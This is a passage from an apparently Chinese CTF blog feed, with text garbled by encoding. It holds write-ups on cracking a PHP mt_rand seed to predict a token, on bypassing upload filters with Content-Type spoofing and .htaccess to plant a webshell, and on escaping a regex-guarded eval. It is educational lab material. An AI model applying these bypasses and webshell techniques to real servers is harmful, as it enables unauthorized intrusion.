<p>ä¸¾ä¸ªä¸é è°±çš„ä¾‹å­ï¼šå‡è®¾æŸä¸ªå‡½æ•°y=ax+bï¼Œè€Œæˆ‘ä»¬ä¼ å…¥çš„seedå°±æ˜¯xï¼Œaå’Œbéƒ½æ˜¯ç»™å®šå¸¸æ•°ã€‚é‚£ä¹ˆåªè¦ç¡®å®šäº†xï¼Œå°±èƒ½å¤Ÿå¾—åˆ°yï¼›åä¹‹ï¼Œå¦‚æœæˆ‘ä»¬æœ‰yï¼Œå°±èƒ½å¤Ÿå¾—åˆ°xã€‚</p>
<p>å› æ­¤ï¼Œåˆ©ç”¨phpä¼ªéšæœºæ•°ç”Ÿæˆçš„å¯†ç æˆ–è€…tokenæ˜¯ä¸å®‰å…¨çš„ã€‚å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„å·¥å…·ç ´è§£ï¼š</p>
<ul>
<li>å·¥å…·ï¼š<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker</a></li>
</ul>
<h1 id="è§£é¢˜">3. è§£é¢˜</h1>
<p>é¦–å…ˆåˆ†æä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥ç®€å•çš„åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ã€‚</p>
<h2 id="ç¬¬ä¸€éƒ¨åˆ†">3.1. ç¬¬ä¸€éƒ¨åˆ†</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆå¼€å¯ä¸€ä¸ªsessionï¼Œç„¶åå¦‚æœæˆ‘ä»¬çš„è¯·æ±‚æŠ¥ä¸­æ²¡æœ‰seedï¼Œåˆ™å°±éšæœºä¸€ä¸ªå€¼å½“ä½œseedã€‚</p>
<h2 id="ç¬¬äºŒéƒ¨åˆ†">3.2. ç¬¬äºŒéƒ¨åˆ†</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯æœ€é‡è¦çš„éƒ¨åˆ†ã€‚é¦–å…ˆé€šè¿‡mt_srand()å‡½æ•°è®¾ç½®ä¸€ä¸ªç§å­ï¼Œå³ä¸Šä¸€éƒ¨åˆ†çš„seedï¼Œç„¶åä»å¤§å°å†™å­—æ¯å’Œæ•°å­—ä¸­éšæœºæŒ‘é€‰20ä¸ªï¼ˆå¯é‡å¤ï¼‰æ„æˆstrã€‚é€‰å–strçš„å‰10ä½æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<h2 id="ç¬¬ä¸‰éƒ¨åˆ†">3.3. ç¬¬ä¸‰éƒ¨åˆ†</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬éœ€è¦é€šè¿‡POSTæ–¹å¼æäº¤å‚æ•°numçš„å€¼ï¼Œç„¶åä¸ä¸Šä¸€éƒ¨åˆ†å¾—åˆ°çš„20ä½çš„stråšå¯¹æ¯”ï¼Œå¦‚æœä¸€è‡´ï¼Œåˆ™get flagã€‚</p>
<h2 id="payloadæ„é€ ">3.4. payloadæ„é€ </h2>
<p>å…¶å®çœ‹åˆ°è¿™é¢˜ç›®ï¼Œæˆ‘æœ€å…ˆæƒ³åˆ°çš„æ˜¯çˆ†ç ´å10ä½ã€‚è¿™ç§æ–¹æ³•çš„æ³¨æ„ç‚¹æ˜¯ï¼Œéœ€è¦ä¿æŒsessionï¼Œå¦åˆ™æ¯è¯·æ±‚ä¸€æ¬¡ï¼Œstrå°±å‘ç”Ÿäº†å˜åŒ–ã€‚åæ¥ç²—ç•¥è®¡ç®—äº†ä¸€ä¸‹ï¼Œéœ€è¦ <span class="math inline">\(62^{10}\)</span> çš„è¯·æ±‚æ¬¡æ•°ï¼Œç†è®ºä¸Šå¯è¡Œï¼Œä½†æˆ‘æ„Ÿè§‰ä¸æ˜¯è¿™ä¹ˆåšã€‚åæ¥ç»è¿‡æœç´¢å‘ç°äº†PHPä¼ªéšæœºæ•°æ¼æ´ã€‚</p>
<p>é¦–å…ˆï¼Œç¼–å†™å¦‚ä¸‹ä»£ç ï¼Œå°†ç»™å‡ºçš„10ä¸ªå­—ç¬¦è½¬å˜æˆphp_mt_seedèƒ½å¤Ÿè¯†åˆ«çš„æ•°æ®ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">substr = <span class="string">&quot;R3s7A1z54e&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">length = <span class="built_in">len</span>(str1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(substr)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length):</span><br><span class="line">        <span class="keyword">if</span> str1[j] == substr[i]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(length-<span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line"><span class="number">53</span> <span class="number">53</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span> <span class="number">18</span> <span class="number">18</span> <span class="number">0</span> <span class="number">61</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">27</span> <span class="number">27</span> <span class="number">0</span> <span class="number">61</span> <span class="number">25</span> <span class="number">25</span> <span class="number">0</span> <span class="number">61</span> <span class="number">31</span> <span class="number">31</span> <span class="number">0</span> <span class="number">61</span> <span class="number">30</span> <span class="number">30</span> <span class="number">0</span> <span class="number">61</span> <span class="number">4</span> <span class="number">4</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure></p>
<p>ç„¶åæ‰§è¡Œï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./php_mt_seed 53 53 0 61 29 29 0 61 18 18 0 61 33 33 0 61 36 36 0 61 27 27 0 61 25 25 0 61 31 31 0 61 30 30 0 61 4 4 0 61</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426151032.png" /></p>
<p>å¾—åˆ°seedã€‚</p>
<p>æœ€åï¼Œç¼–å†™å¦‚ä¸‹phpä»£ç ï¼Œç”Ÿæˆ20ä¸ªå­—ç¬¦ï¼Œå› ä¸ºseedç›¸åŒï¼Œå› æ­¤ç”Ÿæˆçš„è¿™20ä¸ªå­—ç¬¦ä¸é¢˜ç›®çš„ä¸€è‡´ã€‚ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">566162825</span>); </span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ç‚¹ï¼ï¼ï¼é‚£å°±æ˜¯phpç‰ˆæœ¬è¦é€‰å¯¹ï¼ï¼ï¼è¦å’Œå·¥å…·ç»™å‡ºçš„seedæ—è¾¹çš„ç‰ˆæœ¬ç›¸åŒ¹é…æ‰èƒ½å¤Ÿç”Ÿæˆä¸€æ ·çš„å­—ç¬¦ä¸²ï¼ï¼ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426151517.png" /></p>
<p>å°†å¾—åˆ°çš„payloadç”¨POSTæ–¹å¼æäº¤å³å¯ã€‚</p>
<blockquote>
<p>è¿™è¿‡ç¨‹ä¸­ï¼Œè¦ä¿æŒæµè§ˆå™¨ä¸è¦å…³é—­ï¼Œå¦åˆ™sessionå°±æ–­äº†ï¼Œé‚£ä¹ˆseedå¯èƒ½å°±ä¸ä¸€æ ·äº†ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHPä¼ªéšæœºæ•°</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 BabyUpload</title>
    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼šhttps://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>æ‰“å¼€ç¯å¢ƒå¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
<h1 id="è¿‡æ»¤æµ‹è¯•">è¿‡æ»¤æµ‹è¯•</h1>
<h2 id="è¿‡æ»¤ç±»å‹æµ‹è¯•">è¿‡æ»¤ç±»å‹æµ‹è¯•</h2>
<p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
<p>æ ¹æ®æç¤º <code>ä¸Šä¼ ç±»å‹</code> æ¨æµ‹åº”è¯¥éœ€è¦ä¿®æ”¹ <code>Content-Type</code>ï¼Œå°è¯• <code>image/gif</code> å’Œ <code>imag/jpeg</code> åï¼Œå‘ç°åè€…æ˜¯å¯ä»¥çš„ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
<h2 id="è¿‡æ»¤åç¼€æµ‹è¯•">è¿‡æ»¤åç¼€æµ‹è¯•</h2>
<p>å°†åç¼€ä¿®æ”¹ä¸º <code>php</code> ï¼Œä¸Šä¼  <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
<p>ç»è¿‡å¤šæ¬¡å°è¯•ï¼Œå‘ç°æˆ‘æ— æ³•ç»•è¿‡è¿™ä¸ªè¿‡æ»¤ã€‚æ­¤æ—¶æ€è€ƒï¼Œæ˜¯å¦å¯ä»¥ä¸ç”¨ç‰¹å®šåç¼€åˆå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œæƒ³åˆ°äº† <code>.htaccess</code> ã€‚å°è¯•ä¸€ä¸‹å‘ç°æˆåŠŸï¼ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
<p>è®°å½•ä¸€ä¸‹åœ°å€ <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>ã€‚ä¹‹åï¼Œåªè¦ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åä¸º <code>shell.jpg</code> çš„æœ¨é©¬å³å¯ã€‚</p>
<h2 id="æ–‡ä»¶å†…å®¹è¿‡æ»¤">æ–‡ä»¶å†…å®¹è¿‡æ»¤</h2>
<p>å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åä¸Šä¼ ï¼Œæœä¸å…¶ç„¶è¢«è¿‡æ»¤äº†ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
<p>æ¢ä¸€ç§å†™æ³•å‘ç°è¿˜æ˜¯ä¸è¡Œ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
<p>çŒœæµ‹è¿‡æ»¤çš„åº”è¯¥æ˜¯å¼€å¤´çš„é‚£ä¸ª <code>php</code> ã€‚å› æ­¤ï¼Œæ¢ä¸€ç§å†™æ³•ï¼ŒæˆåŠŸç»•è¿‡ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
<p>è®°å½•ä¸Šä¼ åœ°å€ï¼š<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
<h1 id="èšå‰‘è¿æ¥get-flag">èšå‰‘è¿æ¥get flag</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
<p>flagåœ¨æ ¹ç›®å½• <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
<p>æˆåŠŸã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<ol type="1">
<li>è¦ç†Ÿæ‚‰å¸¸ç”¨çš„ä¸Šä¼ ç±»å‹ï¼Œé¢˜ç›®ä¸­å¤§å¤šè€ƒå¯Ÿçš„æ˜¯å›¾ç‰‡ï¼Œå› æ­¤è¦ç†Ÿè®°ï¼š<code>image/jpeg</code>ã€<code>image/png</code>ã€<code>image/gif</code>ï¼›</li>
<li>å½“è„šæœ¬åç¼€è¢«è¿‡æ»¤ä¹‹åï¼Œå¹¶ä¸”æ— æ³•ç»•è¿‡æ—¶ï¼Œéœ€è¦æƒ³åˆ° <code>.htaccess</code>ï¼›</li>
<li>æ–‡ä»¶å†…å®¹çš„è¿‡æ»¤ï¼Œéœ€è¦çŸ¥é“å¤šç§æœ¨é©¬çš„å†™æ³•ã€‚</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 ç¦æ­¢å¥—å¨ƒ</title>
    <url>/2022/03/24/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼šhttps://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1. é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒä¹‹åå‘ç°ä»€ä¹ˆä¿¡æ¯éƒ½æ²¡æœ‰ï¼Œæ•°æ®åŒ…å’Œæºç éƒ½æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ã€‚å› æ­¤å°è¯•æ‰«æç›®å½•ã€‚ä½†æ˜¯æˆ‘æ²¡æœ‰æ‰«æå‡ºä»€ä¹ˆç»“æœï¼Œå¯èƒ½æ˜¯è„šæœ¬ä¸å¤Ÿå¼ºå¤§å§ã€‚æŠ˜è…¾æ— æœåå»æœç´¢ä¸€ä¸‹åˆ«äººçš„WPï¼Œå‘ç°å­˜åœ¨ <code>git</code> æ³„éœ²ï¼Œå› æ­¤ä½¿ç”¨ <code>githack</code> ä¸‹è½½ã€‚ä¸‹è½½å¾—åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="è§£é¢˜">2. è§£é¢˜</h1>
<p>ç¬¬ä¸€ä¸ª <code>if</code> è¿‡æ»¤äº†ä¸€äº›ä¼ªåè®®ï¼›</p>
<p>ç¬¬äºŒä¸ª <code>if</code> æ¯”è¾ƒéš¾ï¼Œç¬¬ä¸€æ¬¡é‡è§ï¼Œè¿™æ˜¯è¿‡æ»¤äº†å‡½æ•°çš„å‚æ•°ã€‚<code>?(R)?</code> æ˜¯é€’å½’åŒ¹é…æ¨¡å¼çš„æ„æ€ã€‚åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²éƒ½ä¼šè¢«ç©ºä»£æ›¿ï¼Œæœ€åè¿˜éœ€è¦æ»¡è¶³å¼ºå¯¹æ¯”ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¼ å…¥çš„expåœ¨æœ€åå¾—æœ‰ <code>;</code> ï¼Œå¹¶ä¸”å‰é¢çš„éƒ¨åˆ†éƒ½è¦è¢«åŒ¹é…ï¼Œä»è€Œåªå‰©ä¸‹ <code>;</code>ã€‚</p>
<p>è¯¦ç»†è§£é‡Šä¸€ä¸‹ç¬¬äºŒä¸ªåŒ¹é…æ¨¡å¼ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a-z,_]+\((?R)?\)å¯ä»¥åˆ†ä¸ºä»¥ä¸‹4ä¸ªéƒ¨åˆ†ï¼š</span><br><span class="line">1. [a-z,_]  </span><br><span class="line">2. \(   </span><br><span class="line">3. (?R)?   </span><br><span class="line">4. \)</span><br></pre></td></tr></table></figure>
<p>å‡è®¾è¾“å…¥çš„ä¸º <code>print_r(scandir());</code>ã€‚è¿™å¥è¯å°±æ˜¯æ‰«ææŸç›®å½•ï¼ˆæ­¤æ—¶ç›®å½•å¹¶æœªæŒ‡å®šï¼‰ï¼Œç„¶åæŠŠç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åorå­ç›®å½•åå½¢æˆä¸€ä¸ªæ•°ç»„è¿”å›å¹¶æ‰“å°å‡ºæ¥ã€‚</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">è¿‡ç¨‹</th>
<th style="text-align: center;">è¢«åŒ¹é…çš„éƒ¨åˆ†</th>
<th style="text-align: center;">å¤‡æ³¨</th>
<th style="text-align: center;">é€’å½’å±‚æ•°</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">print_r</td>
<td style="text-align: center;"><code>[a-z,_]</code> èµ·ä½œç”¨</td>
<td style="text-align: center;">0</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td style="text-align: center;">print_r(</td>
<td style="text-align: center;"><code>\(</code> èµ·ä½œç”¨</td>
<td style="text-align: center;">0</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3</td>
<td style="text-align: center;">print_r(scandir</td>
<td style="text-align: center;"><code>(?R)?</code> èµ·ä½œç”¨ï¼Œè¿›å…¥é€’å½’ï¼Œå†æ¬¡åŒ¹é…<code>[a-z,_]</code></td>
<td style="text-align: center;">1</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td style="text-align: center;">print_r(scandir(</td>
<td style="text-align: center;"><code>\(</code> å†æ¬¡èµ·ä½œç”¨</td>
<td style="text-align: center;">1</td>
</tr>
<tr class="odd">
<td style="text-align: center;">5</td>
<td style="text-align: center;">print_r(scandir()</td>
<td style="text-align: center;">è¿›å…¥ç¬¬ä¸€ä¸ªé€’å½’ä¹‹åçš„ <code>\)</code> èµ·ä½œç”¨<br>æ‰§è¡Œä¹‹åé€€å‡ºç¬¬ä¸€æ¬¡é€’å½’</td>
<td style="text-align: center;">æ‰§è¡Œæ—¶å±äºï¼š1<br>æ‰§è¡Œç»“æŸåé€€å‡ºç¬¬ä¸€å±‚é€’å½’ï¼š0</td>
</tr>
<tr class="even">
<td style="text-align: center;">6</td>
<td style="text-align: center;">print_r(scandir())</td>
<td style="text-align: center;"><code>\)</code> èµ·ä½œç”¨</td>
<td style="text-align: center;">0</td>
</tr>
</tbody>
</table>
<p>æœ€åå‰©ä¸‹ä¸€ä¸ª <code>;</code> æˆåŠŸåŒ¹é…ã€‚å¦‚æœå¸¦æœ‰å‚æ•°ï¼Œæ¯”å¦‚ï¼š<code>print_r(scandir('/'));</code>ï¼Œåˆ°ç¬¬4æ­¥ä¸ºæ­¢éƒ½æ˜¯ä¸€æ ·çš„ï¼Œç¬¬5æ­¥çš„æ—¶å€™å› ä¸ºæ­¤æ—¶åº”è¯¥åŒ¹é…çš„æ˜¯ <code>\)</code> ï¼Œä½†æ˜¯ï¼Œæ­¤æ—¶å­—ç¬¦ä¸²çš„ä½ç½®æ˜¯ <code>'/')</code> æ— æ³•æˆåŠŸåŒ¹é…ï¼Œè¿”å›åŸæ¥çš„å­—ç¬¦ä¸²ï¼Œä»è€Œæ— æ³•ç»•è¿‡ç¬¬äºŒä¸ª <code>if</code>ã€‚</p>
<p>æˆåŠŸç»•è¿‡æ¼”ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200901.png" /></p>
<p>å¤±è´¥æ¼”ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200923.png" /></p>
<p>ç¬¬ä¸‰ä¸ª <code>if</code> ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåªæ˜¯è¿‡æ»¤äº†ä¸€äº›æ•æ„Ÿè¯ã€‚</p>
<p>æ¥ä¸‹æ¥å°±è¦åšä¸¤ä»¶äº‹ï¼š</p>
<ol type="1">
<li><p>æ‰¾ flag æ‰€åœ¨çš„è·¯å¾„ï¼Œä¸€èˆ¬åœ¨å½“å‰ç›®å½•æˆ–è€…æ ¹ç›®å½•</p></li>
<li><p>æ‰¾åˆ°äº†è¯¥æ€ä¹ˆæŠŠè·¯å¾„è¡¨ç¤ºå‡ºæ¥ï¼Œæ­¤æ—¶ä¸èƒ½ä¼ å…¥å‚æ•°</p></li>
</ol>
<p>æ¥ä¸‹æ¥éœ€è¦å¯¹ PHP æ¯”è¾ƒäº†è§£çš„äººèƒ½å¤Ÿæƒ³å¾—åˆ°ï¼ˆåæ­£æˆ‘ä¸ªèœé¸Ÿæ²¡æœ‰æƒ³åˆ°ï¼‰ï¼Œå…ˆä»‹ç»å‡ ä¸ªå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. localeconv(): å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</span><br><span class="line"><span class="number">2</span>. scandir(): åˆ—å‡ºç»™å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚</span><br><span class="line"><span class="number">3</span>. readfile(): è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚æœ¬é¢˜ä¸­ï¼Œå¦‚æœä½¿ç”¨è¯¥å‡½æ•°è¾“å‡ºflagï¼Œéœ€è¦åœ¨æºç ä¸­æŸ¥çœ‹</span><br><span class="line"><span class="number">4</span>. current(): è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</span><br><span class="line"><span class="number">5</span>. pos(): current() çš„åˆ«åã€‚</span><br><span class="line"><span class="number">6</span>. next(): å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line"><span class="number">7</span>. array_reverse(): ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚</span><br><span class="line"><span class="number">8</span>. highlight_file(): æ‰“å°è¾“å‡ºæˆ–è€…è¿”å› filename æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ã€‚</span><br><span class="line"><span class="number">9</span>. array_flip(): å°†æ•°ç»„çš„é”®å’Œå€¼äº’æ¢</span><br><span class="line"><span class="number">10</span>. array_rand(): éšæœºè¯»å–æ•°ç»„ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</span><br></pre></td></tr></table></figure>
